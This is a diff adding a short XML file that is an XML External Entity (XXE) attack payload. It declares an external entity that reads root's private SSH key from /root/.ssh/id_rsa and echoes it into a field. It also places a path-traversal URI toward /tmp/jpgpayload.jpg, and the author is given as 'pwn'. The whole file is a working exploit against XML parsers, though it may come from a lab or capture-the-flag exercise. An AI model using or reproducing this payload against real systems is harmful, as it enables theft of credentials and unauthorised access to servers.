@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY sp SYSTEM "file:///root/.ssh/id_rsa" >]>
+<credits>
+  <author>pwn</author>
+  <image>
+    <uri>/../../../../../../tmp/jpgpayload.jpg</uri>
+    <views>1</views>
+    <foo>&sp;</foo>
+  </image>
+  <totalviews>2</totalviews>
+</credits>
